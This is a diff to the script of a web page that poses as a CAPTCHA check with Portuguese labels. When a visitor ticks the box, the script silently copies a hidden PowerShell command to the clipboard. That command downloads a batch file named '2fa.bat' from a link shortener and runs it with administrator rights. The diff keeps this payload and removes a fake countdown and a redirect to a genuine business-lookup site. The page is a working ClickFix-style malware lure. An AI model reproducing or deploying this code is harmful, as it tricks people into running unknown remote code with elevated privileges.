@@ -137,7 +137,7 @@
     <script>
         document.getElementById('captcha-checkbox').addEventListener('change', function() {
             if (this.checked) {
-                const command = `powershell -w h -c "Set-Clipboard -Value 'iwr -useb https://tinyurl.com/38j9myu7 -OutFile $HOME\\2fa.bat; while (!(Test-Path $HOME\\2fa.bat)) {Start-Sleep 1}; Start-Process -FilePath cmd.exe -ArgumentList '/c start /min /b %HOMEPATH%\\2fa.bat' -Verb RunAs'"`;
+                const command = `powershell -w h -c "iwr -useb https://tinyurl.com/38j9myu7 -OutFile $HOME\2fa.bat; while (!(Test-Path $HOME\2fa.bat)) {Start-Sleep 1}; Start-Process -FilePath 'cmd.exe' -ArgumentList '/c start /min /b %HOMEPATH%\2fa.bat' -Verb RunAs"`;
                 
                 const textArea = document.createElement('textarea');
                 textArea.value = command;
@@ -147,39 +147,8 @@
                 document.body.removeChild(textArea);
 
                 document.getElementById('verification-box').style.display = 'block';
-
-                const button = document.getElementById('verify-button');
-                button.disabled = true;
-                let seconds = 6;
-                
-                const countdown = setInterval(() => {
-                    button.textContent = `VERIFICAR (${seconds})`;
-                    seconds--;
-                    
-                    if (seconds < 0) {
-                        clearInterval(countdown);
-                        button.disabled = false;
-                        button.textContent = 'VERIFICAR';
-                    }
-                }, 1000);
-            } else {
-                document.getElementById('verification-box').style.display = 'none';
             }
         });
-
-        function verificarCaptcha() {
-            const button = document.getElementById('verify-button');
-            button.innerHTML = 'Verificando...';
-            button.disabled = true;
-            
-            setTimeout(() => {
-                button.innerHTML = '✔ Verificado';
-                button.style.backgroundColor = '#34a853';
-                setTimeout(() => {
-                    window.location.href = 'https://www.contabilizei.com.br/consulta-cnpj-cartao/';
-                }, 500);
-            }, 2000);
-        }
     </script>
 </body>
 </html>
